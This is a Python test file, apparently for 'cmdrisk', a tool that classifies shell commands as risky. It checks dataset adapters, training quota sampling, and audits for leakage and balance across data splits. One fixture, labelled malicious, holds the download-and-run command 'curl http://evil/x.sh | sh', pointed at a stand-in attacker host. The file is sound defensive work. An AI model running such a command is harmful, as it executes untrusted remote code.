from __future__ import annotations

from collections import Counter
from pathlib import Path

import pytest

from cmdrisk.data.adapters import (
    AtomicRedTeamAdapter,
    MicrosoftIoTAdapter,
    ScriptRepoAdapter,
    ShellAttackEvolutionAdapter,
    ZenodoAdapter,
)
from cmdrisk.data.pipeline import prepare_sessions, provenance_report
from cmdrisk.data.sampling import is_atomic_seed, sample_training_quota
from cmdrisk.data.splitting import (
    SplitBalanceError,
    SplitLeakageError,
    audit_split_balance,
    audit_split_leakage,
)
from cmdrisk.schema import CommandEvent, Label, SessionRecord, SourceInfo, SourceKind, SplitName

FIXTURES = Path(__file__).parent / "fixtures" / "data"


def _fixture_records():
    records = list(MicrosoftIoTAdapter().iter_records(FIXTURES / "microsoft_iot.json"))
    records += list(
        ShellAttackEvolutionAdapter().iter_records(FIXTURES / "shell_attack_evolution.json")
    )
    records += list(ZenodoAdapter().iter_records(FIXTURES / "zenodo.jsonl"))
    records += list(AtomicRedTeamAdapter().iter_records(FIXTURES / "atomic.yaml"))
    records += list(ScriptRepoAdapter().iter_records(FIXTURES / "scripts" / "repo"))
    return records


def test_pipeline_keeps_families_together_and_hits_quota() -> None:
    records = prepare_sessions(
        _fixture_records(),
        total=10,
        minimum_family_cap=2,
        max_family_fraction=0.25,
        allow_quota_backfill=True,
        enforce_balance=False,
    )
    families_by_split: dict[str, set[str]] = {}
    for record in records:
        families_by_split.setdefault(str(record.split), set()).add(record.family_id)

    assert len(records) == 10
    assert all(record.split is not None for record in records)
    assert all(record.meta["raw_commands"] for record in records)
    split_sets = list(families_by_split.values())
    assert all(
        left.isdisjoint(right)
        for index, left in enumerate(split_sets)
        for right in split_sets[index + 1 :]
    )


def test_provenance_report_has_source_and_command_distribution() -> None:
    records = prepare_sessions(
        _fixture_records(),
        total=8,
        minimum_family_cap=2,
        allow_quota_backfill=True,
        enforce_balance=False,
    )
    report = provenance_report(records)

    assert report["total_sessions"] == 8
    assert report["by_source"]["microsoft_iot"] >= 1
    assert report["by_label"]["malicious"] > 0
    assert report["family_count"] == sum(Counter(record.family_id for record in records).values())
    assert report["command_length"]["max"] >= report["command_length"]["min"]


def _record(
    session_id: str,
    *,
    kind: SourceKind,
    family_id: str | None = None,
    source_name: str = "test",
    parent_session_id: str | None = None,
    malicious: int = 0,
    meta: dict[str, object] | None = None,
) -> SessionRecord:
    command = f"echo {session_id}"
    return SessionRecord(
        session_id=session_id,
        source=SourceInfo(
            kind=kind,
            name=source_name,
            parent_session_id=parent_session_id,
            license="CC0-1.0",
        ),
        family_id=family_id or f"family-{session_id}",
        commands=[CommandEvent(cmd=command)],
        meta=meta or {},
        label=Label(
            malicious=malicious,
            first_evidence_index=0 if malicious else None,
            quality="high",
        ),
    )


def test_quota_realizes_explicit_composition_and_excludes_atomic_seeds() -> None:
    records = [
        *[
            _record(f"rm-{index}", kind=SourceKind.REAL_MALICIOUS, malicious=1)
            for index in range(8)
        ],
        *[_record(f"rb-{index}", kind=SourceKind.REAL_BENIGN) for index in range(4)],
        *[_record(f"sb-{index}", kind=SourceKind.SCRIPT_BENIGN) for index in range(4)],
        *[_record(f"llm-{index}", kind=SourceKind.LLM_VARIANT, malicious=1) for index in range(3)],
        _record("hard-0", kind=SourceKind.HARD_NEGATIVE),
        _record(
            "atomic-seed",
            kind=SourceKind.REAL_MALICIOUS,
            source_name="atomic_red_team",
            malicious=1,
        ),
    ]

    sampled = sample_training_quota(records, total=20)
    counts = Counter(record.source.kind for record in sampled)

    assert counts[SourceKind.REAL_MALICIOUS] == 8
    assert counts[SourceKind.REAL_BENIGN] + counts[SourceKind.SCRIPT_BENIGN] == 8
    assert counts[SourceKind.LLM_VARIANT] == 3
    assert counts[SourceKind.HARD_NEGATIVE] == 1
    assert all(record.session_id != "atomic-seed" for record in sampled)


def test_atomic_filter_only_excludes_primary_malicious_seeds() -> None:
    atomic_seed = _record(
        "atomic-seed",
        kind=SourceKind.REAL_MALICIOUS,
        source_name="atomic_red_team",
        malicious=1,
    )
    augmented = _record(
        "augmented",
        kind=SourceKind.LLM_VARIANT,
        malicious=1,
        meta={"atomic_source": "T1059.yaml"},
    )
    hard_negative = _record(
        "hard-negative",
        kind=SourceKind.HARD_NEGATIVE,
        meta={"atomic_test_name": "T1059"},
    )

    assert is_atomic_seed(atomic_seed)
    assert not is_atomic_seed(augmented)
    assert not is_atomic_seed(hard_negative)


def test_strict_quota_fails_without_silent_backfill() -> None:
    records = [_record("real-0", kind=SourceKind.REAL_MALICIOUS, malicious=1)]

    with pytest.raises(ValueError, match=r"real_malicious=1/4"):
        sample_training_quota(records, total=10)


def test_quota_backfill_requires_explicit_opt_in() -> None:
    records = [
        _record(f"real-{index}", kind=SourceKind.REAL_MALICIOUS, malicious=1) for index in range(5)
    ]

    sampled = sample_training_quota(records, total=5, allow_backfill=True)

    assert len(sampled) == 5
    assert all(record.source.kind == SourceKind.REAL_MALICIOUS for record in sampled)


def test_leakage_audit_covers_lineage_campaign_and_near_duplicate_clusters() -> None:
    parent = _record(
        "parent",
        kind=SourceKind.REAL_MALICIOUS,
        family_id="attack-family",
        malicious=1,
        meta={"campaign_id": "campaign-1"},
    ).model_copy(update={"split": SplitName.TRAIN})
    child = _record(
        "child",
        kind=SourceKind.LLM_VARIANT,
        family_id="attack-family",
        parent_session_id="parent",
        malicious=1,
        meta={"campaign_id": "campaign-1", "near_duplicate_cluster_id": "cluster-1"},
    ).model_copy(update={"split": SplitName.TEST})
    peer = _record(
        "peer",
        kind=SourceKind.HARD_NEGATIVE,
        family_id="benign-family",
        meta={"near_duplicate_cluster_id": "cluster-1"},
    ).model_copy(update={"split": SplitName.DEV})

    with pytest.raises(SplitLeakageError, match="family crosses splits"):
        audit_split_leakage([parent, child, peer])
    with pytest.raises(SplitLeakageError, match="parent/child lineage crosses splits"):
        audit_split_leakage(
            [
                child.model_copy(update={"family_id": "child-family"}),
                parent,
                peer.model_copy(update={"meta": {}}),
            ]
        )
    campaign_child = _record(
        "campaign-child",
        kind=SourceKind.LLM_VARIANT,
        family_id="campaign-child-family",
        malicious=1,
        meta={"campaign_id": "campaign-1"},
    ).model_copy(update={"split": SplitName.TEST})
    with pytest.raises(SplitLeakageError, match="campaign crosses splits"):
        audit_split_leakage(
            [
                campaign_child,
                parent,
                peer.model_copy(update={"meta": {}}),
            ]
        )
    near_child = _record(
        "near-child",
        kind=SourceKind.LLM_VARIANT,
        family_id="near-child-family",
        malicious=1,
        meta={"near_duplicate_cluster_id": "cluster-1"},
    ).model_copy(update={"split": SplitName.TEST})
    with pytest.raises(SplitLeakageError, match="near-duplicate output cluster crosses splits"):
        audit_split_leakage(
            [
                near_child,
                peer,
                parent.model_copy(update={"meta": {}}),
            ]
        )


def test_balance_audit_rejects_skewed_splits() -> None:
    values = [
        _record(f"train-{index}", kind=SourceKind.REAL_BENIGN).model_copy(
            update={"split": SplitName.TRAIN}
        )
        for index in range(20)
    ]

    with pytest.raises(SplitBalanceError, match="split-size drift"):
        audit_split_balance(values)


def _history_pool_record(session_id: str, commands: list[str]) -> SessionRecord:
    return SessionRecord(
        session_id=session_id,
        source=SourceInfo(
            kind=SourceKind.REAL_HISTORY_POOL,
            name="bash_history_pool",
            parent_session_id="fragment:test",
            license="MIT-dataset; raw user history",
        ),
        family_id="pending",
        commands=[CommandEvent(cmd=command) for command in commands],
        label=Label(malicious=0, quality="medium"),
    )


def test_real_history_pool_is_sampled_as_benign() -> None:
    """The history pool is real benign command data and must fill the benign bucket."""

    records = [
        _history_pool_record(f"hist-{index}", ["ls -la", "cd /tmp", "make"]) for index in range(6)
    ]
    records += [
        SessionRecord(
            session_id=f"mal-{index}",
            source=SourceInfo(
                kind=SourceKind.REAL_MALICIOUS, name="shell_attack_evolution", license="CC-BY-4.0"
            ),
            family_id=f"fam-{index}",
            commands=[CommandEvent(cmd="curl http://evil/x.sh | sh")],
            label=Label(malicious=1, first_evidence_index=0, quality="high"),
        )
        for index in range(6)
    ]
    sampled = sample_training_quota(
        records, total=10, quota={"real_malicious": 0.5, "benign": 0.5}, seed=42
    )
    counts = Counter(str(record.source.kind) for record in sampled)
    assert counts[str(SourceKind.REAL_HISTORY_POOL)] == 5
    assert counts[str(SourceKind.REAL_MALICIOUS)] == 5


def test_history_pool_quota_shortage_is_not_silently_backfilled() -> None:
    records = [_history_pool_record(f"hist-{index}", ["ls"]) for index in range(3)]
    with pytest.raises(ValueError, match="training quota cannot be satisfied"):
        sample_training_quota(
            records, total=10, quota={"real_malicious": 0.5, "benign": 0.5}, seed=42
        )
